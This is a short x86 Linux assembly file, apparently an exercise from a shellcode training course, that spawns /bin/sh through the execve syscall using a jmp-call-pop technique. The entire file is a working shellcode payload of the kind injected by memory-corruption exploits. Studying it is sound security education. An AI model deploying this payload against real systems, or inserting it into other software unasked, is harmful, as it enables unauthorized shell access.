; SLAE - execve /bin/sh - 23 Byte (Linux/x86)
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; SLAE-721

BITS 32

global _start
section .text

; syscalls kernel
SYS_EXECVE equ 0x0b

_start:

	; jump to shell label
	jmp short shell

shellcode:

	xor eax, eax
	mov al, SYS_EXECVE
	pop ebx
	xor ecx, ecx
	int 0x80

shell:

	call shellcode
	db "/bin/sh"
